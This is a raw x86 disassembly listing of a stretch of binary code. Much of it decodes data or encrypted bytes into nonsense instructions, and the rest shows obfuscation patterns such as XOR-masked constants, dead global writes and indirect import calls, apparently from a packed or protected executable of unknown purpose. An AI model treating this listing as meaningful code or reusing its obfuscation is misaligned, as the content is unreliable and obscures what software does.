  420d15:	xchg   edi,eax
  420d16:	jge    0x420d4f
  420d18:	adc    al,0xf9
  420d1a:	pop    ebp
  420d1b:	or     DWORD PTR [ebx],ebx
  420d1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d1e:	xchg   esp,eax
  420d1f:	rcr    cl,0x94
  420d22:	arpl   WORD PTR ds:0x6dfa581,bp
  420d28:	or     DWORD PTR [eax+ebp*2+0x59],esp
  420d2c:	mov    bl,0xa3
  420d2e:	in     eax,dx
  420d2f:	mov    gs,edx
  420d31:	repz inc edx
  420d33:	js     0x420d4c
  420d35:	pop    es
  420d36:	xor    eax,0x1ec40aeb
  420d3b:	mov    dh,0xf5
  420d3d:	loop   0x420cd6
  420d3f:	xchg   DWORD PTR [esi+0x66a7afa5],esi
  420d45:	xchg   ecx,eax
  420d46:	fsubr  QWORD PTR [esi+0x3c]
  420d49:	mov    eax,ds:0x9788924e
  420d4e:	push   ebp
  420d4f:	jl     0x420d3b
  420d51:	cmp    DWORD PTR [edx+edx*4],0x875b005c
  420d58:	jmp    0x420dca
  420d5a:	and    al,0x67
  420d5c:	inc    esp
  420d5d:	jne    0x420dcf
  420d5f:	hlt    
  420d60:	cmp    DWORD PTR [edi+ecx*1-0x5bd0dddf],eax
  420d67:	fs xchg esi,eax
  420d69:	mov    bl,0x33
  420d6b:	es pop esi
  420d6d:	mov    edi,0x44d1fac3
  420d72:	mov    ecx,ebp
  420d74:	sti    
  420d75:	into   
  420d76:	sbb    al,0xf0
  420d78:	cwde   
  420d79:	adc    al,0x9a
  420d7b:	jmp    0x421a8341
  420d80:	loopne 0x420dc0
  420d82:	dec    esi
  420d83:	sbb    al,0x5c
  420d85:	jns    0x420d7c
  420d87:	in     al,dx
  420d88:	cmp    DWORD PTR [edi+0xb6756b2],0x6cd81aaf
  420d92:	xchg   ecx,eax
  420d93:	push   eax
  420d94:	or     ebx,edx
  420d96:	adc    DWORD PTR [ecx-0x7d],esi
  420d99:	fwait
  420d9a:	push   cs
  420d9b:	in     al,dx
  420d9c:	inc    ebp
  420d9d:	ins    DWORD PTR es:[edi],dx
  420d9e:	call   FWORD PTR [edx+0x3ad5a6e0]
  420da4:	ins    DWORD PTR es:[edi],dx
  420da5:	inc    edx
  420da6:	mov    bl,0x72
  420da8:	and    al,0x32
  420daa:	mov    ah,BYTE PTR [ecx-0x61]
  420dad:	enter  0xe921,0x6
  420db1:	pop    eax
  420db2:	dec    eax
  420db3:	popf   
  420db4:	in     eax,dx
  420db5:	add    eax,0x46aa6f80
  420dba:	fwait
  420dbb:	das    
  420dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dbd:	call   0x9010819b
  420dc2:	inc    esp
  420dc3:	cmp    ebx,DWORD PTR [edx-0x13]
  420dc6:	das    
  420dc7:	sbb    al,BYTE PTR [ebx-0x26cdb571]
  420dcd:	xchg   esp,eax
  420dce:	and    bl,BYTE PTR [ecx+0x3f16af3]
  420dd4:	xlat   BYTE PTR ds:[ebx]
  420dd5:	pop    edx
  420dd6:	or     eax,0x71a70c80
  420ddb:	into   
  420ddc:	test   DWORD PTR [edi+0x77],0xaccd4c98
  420de3:	popa   
  420de4:	jo     0x420d74
  420de6:	jmp    0x420d7a
  420de8:	mov    ch,0x45
  420dea:	test   al,0x8a
  420dec:	test   DWORD PTR [edi],edx
  420dee:	push   es
  420def:	call   0xb2ae3087
  420df4:	daa    
  420df5:	lods   eax,DWORD PTR ds:[esi]
  420df6:	loope  0x420dbf
  420df8:	adc    BYTE PTR [eax],bl
  420dfa:	push   ss
  420dfb:	pop    ecx
  420dfc:	gs leave 
  420dfe:	jmp    0x7f42:0xd9508843
  420e05:	pop    es
  420e06:	adc    edi,0xc2e888a9
  420e0c:	sbb    ebp,esi
  420e0e:	cli    
  420e0f:	lods   eax,DWORD PTR ds:[esi]
  420e10:	(bad)  
  420e11:	push   ebx
  420e12:	popf   
  420e13:	push   es
  420e14:	xchg   esi,eax
  420e15:	inc    edx
  420e16:	jp     0x420e02
  420e18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e19:	imul   esi,DWORD PTR [eax],0xda07806f
  420e1f:	in     eax,0x55
  420e21:	pop    eax
  420e22:	das    
  420e23:	or     ch,BYTE PTR [eax-0x15]
  420e26:	xchg   ecx,eax
  420e27:	inc    ebx
  420e28:	test   al,0xd3
  420e2a:	lds    eax,FWORD PTR [di-0x21f]
  420e2f:	out    0xf2,eax
  420e31:	and    al,0xdd
  420e33:	and    al,0x57
  420e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e36:	adc    dh,BYTE PTR [edi+0x44]
  420e39:	mov    cl,0xcc
  420e3b:	lods   al,BYTE PTR ds:[esi]
  420e3c:	mov    al,ds:0x256586bd
  420e41:	jge    0x420e40
  420e43:	inc    eax
  420e44:	adc    al,0xa4
  420e46:	sbb    ah,BYTE PTR [bx-0x7d32]
  420e4b:	jp     0x420dff
  420e4d:	(bad)
  420e50:	xor    DWORD PTR [esi],0x66
  420e53:	fs icebp 
  420e55:	es in  al,dx
  420e57:	addr16 sub edx,0x29ad
  420e5e:	mov    esi,DWORD PTR ds:0x42814b
  420e64:	sbb    DWORD PTR ds:0x42833f,esi
  420e6a:	imul   edx,eax
  420e6d:	cmp    DWORD PTR ds:0x42835b,0x0
  420e74:	mov    DWORD PTR ds:0x428213,ebx
  420e7a:	mov    DWORD PTR ds:0x42814b,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x42813f
  420e8e:	mov    DWORD PTR ds:0x428223,0x776f
  420e98:	cmp    DWORD PTR ds:0x42835b,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x4281f7
  420eaa:	push   0x42805f
  420eaf:	call   DWORD PTR ds:0x428e18
  420eb5:	add    ecx,DWORD PTR ds:0x428357
  420ebb:	xor    esi,DWORD PTR ds:0x4281ef
  420ec1:	adc    DWORD PTR ds:0x428247,edx
  420ec7:	xor    DWORD PTR ds:0x4282cf,edx
  420ecd:	mov    esi,DWORD PTR ds:0x4281fb
  420ed3:	or     esi,DWORD PTR ds:0x428157
  420ed9:	mov    DWORD PTR ds:0x4281fb,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x42822f
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x428117
  420eef:	sbb    eax,DWORD PTR ds:0x4282cb
  420ef5:	mov    ds:0x428117,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x4281c7
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x42831f
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x4282cf,0x0
  420f23:	mov    DWORD PTR ds:0x428263,0x1362
  420f2d:	mov    DWORD PTR ds:0x428213,edx
  420f33:	mov    DWORD PTR ds:0x42824f,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x428333,0xeb5
  420f48:	cmp    DWORD PTR ds:0x4282cf,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428e90
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x42819f
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x4281ab
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x428227,ecx
  420f81:	mov    edx,DWORD PTR ds:0x42821f
  420f87:	sbb    edx,DWORD PTR ds:0x428367
  420f8d:	mov    DWORD PTR ds:0x42821f,edx
  420f93:	add    DWORD PTR ds:0x42815b,ecx
  420f99:	sub    DWORD PTR ds:0x42834b,0x4282bb
  420fa3:	cmp    DWORD PTR ds:0x428247,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x42832b
  420fb0:	movzx  edx,BYTE PTR ds:0x428133
  420fb7:	mov    DWORD PTR ds:0x4282b7,0x5580
  420fc1:	mov    DWORD PTR ds:0x428363,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x428367,0x673a
  420fd6:	cmp    DWORD PTR ds:0x428247,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428d34
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x4282c7
  421000:	sbb    DWORD PTR ds:0x428243,edx
  421006:	movzx  edx,WORD PTR ds:0x42811b
  42100d:	or     edx,DWORD PTR ds:0x428343
  421013:	mov    DWORD PTR ds:0x42811b,edx
  421019:	dec    DWORD PTR ds:0x428333
  42101f:	sub    DWORD PTR ds:0x42823f,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x42812b,0x0
  421048:	mov    DWORD PTR ds:0x428337,0x62d9
  421052:	mov    DWORD PTR ds:0x428117,0x300d
  42105c:	mov    DWORD PTR ds:0x42811b,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x4282bf
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x42832f,0x134d
  42107b:	cmp    DWORD PTR ds:0x42812b,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428d54
  4210a1:	sbb    ecx,DWORD PTR ds:0x428243
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x428267,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x428123
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x4221f7
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x42133a
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0xb9bc:0x65828d2a
  42115b:	inc    edi
  42115c:	mov    bl,0x7c
  42115e:	ror    DWORD PTR [edi],0x16
  421161:	sbb    BYTE PTR [eax+0x16],bh
  421164:	sbb    BYTE PTR [eax],bl
  421166:	aas    
  421167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421168:	and    al,0x9e
  42116b:	xchg   ebp,eax
  42116c:	cmp    DWORD PTR [eax-0x63],ebp
  42116f:	call   0xb8db1db9
  421174:	and    DWORD PTR [esi],edi
  421176:	sub    eax,0xedb53630
  42117b:	add    ah,BYTE PTR [edx+0x67]
  42117e:	scas   al,BYTE PTR es:[edi]
  42117f:	out    0x73,al
  421181:	outs   dx,DWORD PTR ds:[esi]
  421182:	xchg   BYTE PTR [ebx-0x4a22f759],bh
  421188:	inc    edx
  421189:	jno    0x42119e
  42118b:	mov    cl,0xfc
  42118d:	sbb    ebp,ebx
  42118f:	retf   
  421190:	aas    
  421191:	jg     0x4211b6
  421193:	out    dx,eax
  421194:	push   esp
  421195:	mov    ebp,0x581d4dc4
  42119a:	sbb    DWORD PTR [edi-0x14c15950],eax
  4211a0:	in     eax,dx
  4211a1:	jbe    0x4211b8
  4211a3:	stos   DWORD PTR es:[edi],eax
  4211a4:	mov    edx,0x4cb87ca3
  4211a9:	int3   
  4211aa:	adc    DWORD PTR [eax],esp
  4211ac:	and    BYTE PTR [ebx-0x1b],cl
  4211af:	loop   0x42115d
  4211b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211b2:	push   ds
  4211b3:	cmp    dh,BYTE PTR [edi+0x5ff1878d]
  4211b9:	idiv   BYTE PTR [edi]
  4211bb:	mov    bl,0xba
  4211bd:	xchg   ebp,eax
  4211be:	jns    0x4211dc
  4211c0:	(bad)  
  4211c1:	pop    esp
  4211c2:	pxor   mm6,QWORD PTR [edi-0x39e4adcb]
  4211c9:	fwait
  4211ca:	(bad)  
  4211cc:	add    bh,BYTE PTR [ecx-0x14781991]
  4211d2:	add    al,bl
  4211d4:	shl    DWORD PTR [eax],cl
  4211d6:	test   al,0xdc
  4211d8:	fstp   DWORD PTR [ecx+esi*2+0x0]
  4211dd:	scas   eax,DWORD PTR es:[edi]
  4211de:	push   ds
  4211df:	xchg   ebx,eax
  4211e0:	and    al,bh
  4211e2:	push   0x23
  4211e4:	inc    ebx
  4211e5:	jb     0x4211f6
  4211e7:	or     DWORD PTR [esi+0x72],esi
  4211ea:	mov    ebx,0x421114ba
  4211ef:	or     BYTE PTR [ebx],0x49
  4211f2:	mov    bl,0x29
  4211f4:	js     0x4211e1
  4211f6:	sbb    BYTE PTR [edi+esi*1-0x16],dl
  4211fa:	inc    edx
  4211fb:	hlt    
  4211fc:	xchg   ecx,eax
  4211fd:	sub    BYTE PTR [eax+eiz*4-0x5df48c98],0xcc
  421205:	jge    0x4211cf
  421207:	(bad)  
  421209:	and    DWORD PTR [edi],ebp
  42120b:	cld    
  42120c:	inc    edx
  42120d:	int    0x37
  42120f:	or     DWORD PTR [edi],esp
  421211:	out    0x69,al
  421213:	leave  
  421214:	dec    ecx
  421215:	mov    WORD PTR [ebx-0x213f2e8b],gs
  42121b:	or     al,0x34
  42121d:	out    dx,al
  42121e:	cdq    
  42121f:	nop
  421220:	mov    al,0x42
  421222:	inc    eax
  421223:	sub    DWORD PTR [edi],ecx
  421225:	and    eax,0xdf0e9ed
  42122a:	adc    BYTE PTR [ebp-0x10],al
  42122d:	or     BYTE PTR [esi+0x56b4e547],bh
  421233:	adc    DWORD PTR [esi+eiz*1+0x1b],edi
  421237:	inc    dh
  421239:	cmp    esi,ebp
  42123b:	in     al,0xf1
  42123d:	sub    ebx,DWORD PTR [eax+0x4ab6b174]
  421243:	fld    DWORD PTR [ebp+0x585cb84a]
  421249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42124a:	xchg   edx,eax
  42124b:	shr    BYTE PTR ds:0x73ae11dd,cl
  421251:	xchg   esp,eax
  421252:	in     eax,0x8f
  421254:	xor    eax,0x60af28a0
  421259:	adc    BYTE PTR [esi-0x10],cl
  42125c:	jmp    0x4225:0x511264a3
  421263:	imul   esi,DWORD PTR [ecx-0x5d1fc7d6],0x12
  42126a:	lea    esi,[ecx-0x446d3d2f]
  421270:	mov    ebx,0x5f44db4b
  421275:	push   0xffffff96
  421277:	call   0x1bf01a0a
  42127c:	inc    eax
  42127d:	jecxz  0x4212c9
  42127f:	and    DWORD PTR [ecx+0x3f],edx
  421282:	mov    bl,0xdb
  421284:	aam    0x28
  421286:	sub    BYTE PTR [esi-0x7a],0xef
  42128a:	retf   
  42128b:	loopne 0x421211
  42128d:	sahf   
  42128e:	jns    0x4212ca
  421290:	pop    esp
  421291:	call   0x9233a6f1
  421296:	mov    dh,BYTE PTR [ecx+esi*4-0x78]
  42129a:	inc    edx
  42129b:	ins    BYTE PTR es:[edi],dx
  42129c:	sub    BYTE PTR [edi+0x99cc486],al
  4212a2:	fild   DWORD PTR [ecx+0x33]
  4212a5:	xchg   ebp,eax
  4212a6:	scas   eax,DWORD PTR es:[edi]
  4212a7:	push   esi
  4212a8:	cmp    al,0xc1
  4212aa:	sbb    eax,0x94c16daf
  4212af:	repnz repnz cmp esp,ebx
  4212b3:	mov    cl,0xc6
  4212b5:	dec    ebx
  4212b6:	es retf 0x7d20
  4212ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212bb:	stos   DWORD PTR es:[edi],eax
  4212bc:	aam    0x66
  4212be:	mov    ds:0x6d8f79bd,al
  4212c3:	clc    
  4212c4:	test   BYTE PTR [esi-0x40],ch
  4212c7:	lods   eax,DWORD PTR ds:[esi]
  4212c8:	add    bh,ah
  4212ca:	pop    ecx
  4212cb:	and    ebx,DWORD PTR ds:0x737238bd
  4212d1:	sub    al,0x3b
  4212d3:	mov    dl,0x45
  4212d5:	bswap  esp
  4212d7:	test   BYTE PTR [esp+edx*2-0x40],dh
  4212db:	mov    ebx,0x8f7ade30
  4212e0:	loop   0x421356
  4212e2:	jne    0x42128a
  4212e4:	sbb    BYTE PTR [ecx-0x47],ah
  4212e7:	mov    eax,0xc345a8d4
  4212ec:	sbb    DWORD PTR [eax],esi
  4212ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212ef:	out    dx,eax
  4212f0:	cmc    
  4212f1:	jne    0x421368
  4212f3:	(bad)  
  4212f4:	cwde   
  4212f5:	jp     0x4212d3
  4212f7:	fist   WORD PTR [esi+0x11]
  4212fa:	hlt    
  4212fb:	(bad)  
  4212fe:	int    0x23
  421300:	cmp    DWORD PTR [ebx+0x501c0cc7],esi
  421306:	mov    ds:0x93df822d,al
  42130b:	or     ebx,esi
  42130d:	stos   BYTE PTR es:[edi],al
  42130e:	push   0xc605963c
  421313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421314:	aaa    
  421315:	mov    cl,BYTE PTR [ebx+0x7874c651]
  42131b:	xor    DWORD PTR [edi],ebx
  42131d:	mov    eax,ds:0x7e914709
  421322:	dec    ecx
  421323:	mov    ds:0x8e68c70f,eax
  421328:	inc    ebp
  421329:	idiv   BYTE PTR [edx-0x209a9e34]
  42132f:	mov    ecx,0xa177b01c
  421334:	seta   cl
  421337:	adc    al,0x0
  421339:	sbb    BYTE PTR [ebx-0x15b7b],cl
  42133f:	dec    DWORD PTR [ebx-0x1576b]
  421345:	push   DWORD PTR ds:0xca79a575
  42134b:	xor    edx,0x9c1b89e8
  421351:	mov    cl,0x2
  421353:	call   0x40a9b5
  421358:	mov    ecx,edx
  42135a:	mov    edx,DWORD PTR [ebp-0x15c]
  421360:	mov    DWORD PTR [ebp-0x218],esi
  421366:	mov    esi,DWORD PTR [ebp-0x158]
  42136c:	xor    edx,0xca79a575
  421372:	xor    esi,0x9c1b89e8
  421378:	mov    DWORD PTR [ebp-0x21c],eax
  42137e:	mov    eax,edx
  421380:	mov    edx,esi
  421382:	mov    DWORD PTR [ebp-0x220],ecx
  421388:	mov    cl,0x3e
  42138a:	call   0x4221f7
  42138f:	mov    esi,DWORD PTR [ebp-0x21c]
  421395:	or     esi,eax
  421397:	mov    eax,DWORD PTR [ebp-0x220]
  42139d:	or     eax,edx
  42139f:	push   eax
  4213a0:	push   esi
  4213a1:	push   ebx
  4213a2:	push   edi
  4213a3:	call   0x416c20
  4213a8:	mov    esi,DWORD PTR [ebp-0x218]
  4213ae:	cmp    esi,eax
  4213b0:	jne    0x421466
  4213b6:	mov    eax,DWORD PTR [ebp-0x154]
  4213bc:	mov    edx,DWORD PTR [ebp-0x150]
  4213c2:	xor    eax,0xca79a575
  4213c7:	xor    edx,0x9c1b89e8
  4213cd:	mov    cl,0x2
  4213cf:	call   0x40a9b5
  4213d4:	mov    esi,eax
  4213d6:	mov    edi,edx
  4213d8:	mov    eax,DWORD PTR [ebp-0x154]
  4213de:	mov    edx,DWORD PTR [ebp-0x150]
  4213e4:	xor    eax,0xca79a575
  4213e9:	xor    edx,0x9c1b89e8
  4213ef:	mov    cl,0x3e
  4213f1:	call   0x4221f7
  4213f6:	or     esi,eax
  4213f8:	or     edi,edx
  4213fa:	mov    eax,DWORD PTR [ebp-0x15c]
  421400:	mov    edx,DWORD PTR [ebp-0x158]
  421406:	xor    eax,0xca79a575
  42140b:	xor    edx,0x9c1b89e8
  421411:	mov    cl,0x2
  421413:	call   0x40a9b5
  421418:	mov    ebx,eax
  42141a:	mov    eax,edx
  42141c:	mov    ecx,DWORD PTR [ebp-0x15c]
  421422:	mov    edx,DWORD PTR [ebp-0x158]
  421428:	xor    ecx,0xca79a575
  42142e:	xor    edx,0x9c1b89e8
  421434:	mov    DWORD PTR [ebp-0x224],eax
  42143a:	mov    eax,ecx
  42143c:	mov    cl,0x3e
  42143e:	call   0x4221f7
  421443:	or     ebx,eax
  421445:	mov    eax,DWORD PTR [ebp-0x224]
  42144b:	or     eax,edx
  42144d:	push   eax
  42144e:	push   ebx
  42144f:	push   edi
  421450:	push   esi
  421451:	call   0x416c20
  421456:	mov    DWORD PTR [ebp-0x178],eax
  42145c:	jmp    0x421726
  421461:	jmp    0x4216dc
  421466:	lea    eax,[ebp-0x168]
  42146c:	mov    DWORD PTR [ebp-0x164],eax
  421472:	mov    eax,DWORD PTR [ebp-0x164]
  421478:	mov    DWORD PTR [eax],0xa4069aae
  42147e:	mov    eax,DWORD PTR [ebp-0x168]
  421484:	xor    eax,0xa4069aae
  421489:	shr    eax,0x2
  42148c:	mov    ecx,DWORD PTR [ebp-0x168]
  421492:	xor    ecx,0xa4069aae
  421498:	shl    ecx,0x1e
  42149b:	or     eax,ecx
  42149d:	mov    ecx,DWORD PTR [ebp-0x174]
  4214a3:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4214a7:	mov    DWORD PTR [ebp-0x160],eax
  4214ad:	mov    esi,DWORD PTR [ebp-0x160]
  4214b3:	mov    eax,DWORD PTR [ebp-0x154]
  4214b9:	mov    edx,DWORD PTR [ebp-0x150]
  4214bf:	xor    eax,0xca79a575
  4214c4:	xor    edx,0x9c1b89e8
  4214ca:	mov    cl,0x2
  4214cc:	call   0x40a9b5
  4214d1:	mov    edi,eax
  4214d3:	mov    ebx,edx
  4214d5:	mov    eax,DWORD PTR [ebp-0x154]
  4214db:	mov    edx,DWORD PTR [ebp-0x150]
  4214e1:	xor    eax,0xca79a575
  4214e6:	xor    edx,0x9c1b89e8
  4214ec:	mov    cl,0x3e
  4214ee:	call   0x4221f7
  4214f3:	or     edi,eax
  4214f5:	or     ebx,edx
  4214f7:	mov    eax,DWORD PTR [ebp-0x15c]
  4214fd:	mov    edx,DWORD PTR [ebp-0x158]
  421503:	xor    eax,0xca79a575
  421508:	xor    edx,0x9c1b89e8
  42150e:	mov    cl,0x2
  421510:	call   0x40a9b5
  421515:	mov    ecx,edx
  421517:	mov    edx,DWORD PTR [ebp-0x15c]
  42151d:	mov    DWORD PTR [ebp-0x228],esi
  421523:	mov    esi,DWORD PTR [ebp-0x158]
  421529:	xor    edx,0xca79a575
  42152f:	xor    esi,0x9c1b89e8
  421535:	mov    DWORD PTR [ebp-0x22c],eax
  42153b:	mov    eax,edx
  42153d:	mov    edx,esi
  42153f:	mov    DWORD PTR [ebp-0x230],ecx
  421545:	mov    cl,0x3e
  421547:	call   0x4221f7
  42154c:	mov    esi,DWORD PTR [ebp-0x22c]
  421552:	or     esi,eax
  421554:	mov    eax,DWORD PTR [ebp-0x230]
  42155a:	or     eax,edx
  42155c:	push   eax
  42155d:	push   esi
  42155e:	push   ebx
  42155f:	push   edi
  421560:	call   0x416c20
  421565:	mov    esi,DWORD PTR [ebp-0x228]
  42156b:	cmp    esi,eax
  42156d:	je     0x4215e2
  421573:	mov    eax,DWORD PTR [ebp-0x154]
  421579:	mov    edx,DWORD PTR [ebp-0x150]
  42157f:	xor    eax,0xca79a575
  421584:	xor    edx,0x9c1b89e8
  42158a:	mov    cl,0x2
  42158c:	call   0x40a9b5
  421591:	mov    esi,eax
  421593:	mov    edi,edx
  421595:	mov    eax,DWORD PTR [ebp-0x154]
  42159b:	mov    edx,DWORD PTR [ebp-0x150]
  4215a1:	xor    eax,0xca79a575
  4215a6:	xor    edx,0x9c1b89e8
  4215ac:	mov    cl,0x3e
  4215ae:	call   0x4221f7
  4215b3:	or     esi,eax
  4215b5:	or     edi,edx
  4215b7:	mov    eax,DWORD PTR [ebp-0x160]
  4215bd:	imul   esi,eax
  4215c0:	add    esi,DWORD PTR [ebp-0x170]
  4215c6:	mov    DWORD PTR [ebp-0x16c],esi
  4215cc:	mov    eax,DWORD PTR [ebp-0x16c]
  4215d2:	mov    DWORD PTR [ebp-0x178],eax
  4215d8:	jmp    0x421726
  4215dd:	jmp    0x42168d
  4215e2:	mov    eax,DWORD PTR [ebp-0x154]
  4215e8:	mov    edx,DWORD PTR [ebp-0x150]
  4215ee:	xor    eax,0xca79a575
  4215f3:	xor    edx,0x9c1b89e8
  4215f9:	mov    cl,0x2
  4215fb:	call   0x40a9b5
  421600:	mov    esi,eax
  421602:	mov    edi,edx
  421604:	mov    eax,DWORD PTR [ebp-0x154]
  42160a:	mov    edx,DWORD PTR [ebp-0x150]
  421610:	xor    eax,0xca79a575
  421615:	xor    edx,0x9c1b89e8
  42161b:	mov    cl,0x3e
  42161d:	call   0x4221f7
  421622:	or     esi,eax
  421624:	or     edi,edx
  421626:	mov    eax,DWORD PTR [ebp-0x15c]
  42162c:	mov    edx,DWORD PTR [ebp-0x158]
  421632:	xor    eax,0xca79a575
  421637:	xor    edx,0x9c1b89e8
  42163d:	mov    cl,0x2
  42163f:	call   0x40a9b5
  421644:	mov    ebx,eax
  421646:	mov    eax,edx
  421648:	mov    ecx,DWORD PTR [ebp-0x15c]
  42164e:	mov    edx,DWORD PTR [ebp-0x158]
  421654:	xor    ecx,0xca79a575
  42165a:	xor    edx,0x9c1b89e8
  421660:	mov    DWORD PTR [ebp-0x234],eax
  421666:	mov    eax,ecx
  421668:	mov    cl,0x3e
  42166a:	call   0x4221f7
  42166f:	or     ebx,eax
  421671:	mov    eax,DWORD PTR [ebp-0x234]
  421677:	or     eax,edx
  421679:	push   eax
  42167a:	push   ebx
  42167b:	push   edi
  42167c:	push   esi
  42167d:	call   0x416c20
  421682:	mov    DWORD PTR [ebp-0x178],eax
  421688:	jmp    0x421726
  42168d:	mov    eax,DWORD PTR [ebp-0x15c]
  421693:	mov    edx,DWORD PTR [ebp-0x158]
  421699:	xor    eax,0xca79a575
  42169e:	xor    edx,0x9c1b89e8
  4216a4:	mov    cl,0x2
  4216a6:	call   0x40a9b5
  4216ab:	mov    esi,eax
  4216ad:	mov    edi,edx
  4216af:	mov    eax,DWORD PTR [ebp-0x15c]
  4216b5:	mov    edx,DWORD PTR [ebp-0x158]
  4216bb:	xor    eax,0xca79a575
  4216c0:	xor    edx,0x9c1b89e8
  4216c6:	mov    cl,0x3e
  4216c8:	call   0x4221f7
  4216cd:	or     esi,eax
  4216cf:	or     edi,edx
  4216d1:	mov    DWORD PTR [ebp-0x178],esi
  4216d7:	jmp    0x421726
  4216dc:	mov    eax,DWORD PTR [ebp-0x15c]
  4216e2:	mov    edx,DWORD PTR [ebp-0x158]
  4216e8:	xor    eax,0xca79a575
  4216ed:	xor    edx,0x9c1b89e8
  4216f3:	mov    cl,0x2
  4216f5:	call   0x40a9b5
  4216fa:	mov    esi,eax
  4216fc:	mov    edi,edx
  4216fe:	mov    eax,DWORD PTR [ebp-0x15c]
  421704:	mov    edx,DWORD PTR [ebp-0x158]
  42170a:	xor    eax,0xca79a575
  42170f:	xor    edx,0x9c1b89e8
  421715:	mov    cl,0x3e
  421717:	call   0x4221f7
  42171c:	or     esi,eax
  42171e:	or     edi,edx
  421720:	mov    DWORD PTR [ebp-0x178],esi
  421726:	mov    ecx,DWORD PTR [ebp-0xd8]
  42172c:	mov    eax,0x459a
  421731:	xor    edx,edx
  421733:	div    ecx
  421735:	mov    ecx,DWORD PTR [ebp-0xdc]
  42173b:	and    eax,ecx
  42173d:	add    eax,DWORD PTR [ebp-0x44]
  421740:	mov    ecx,DWORD PTR [ebp-0xe0]
  421746:	lea    eax,[eax+ecx*1+0x272f]
  42174d:	xor    eax,0x1080c
  421752:	add    eax,DWORD PTR [ebp-0x178]
  421758:	mov    DWORD PTR [ebp-0xe8],eax
  42175e:	mov    DWORD PTR [ebp-0xc],0x5950
  421765:	mov    DWORD PTR [ebp-0xf8],0x4964
  42176f:	mov    DWORD PTR [ebp-0x130],0x3
  421779:	mov    DWORD PTR [ebp-0x20],0x2df9
  421780:	mov    DWORD PTR [ebp-0x8],0x4524
  421787:	mov    DWORD PTR [ebp-0xd4],0x637e
  421791:	mov    DWORD PTR [ebp-0x110],0x38c8
  42179b:	mov    DWORD PTR [ebp-0xa4],0x7118
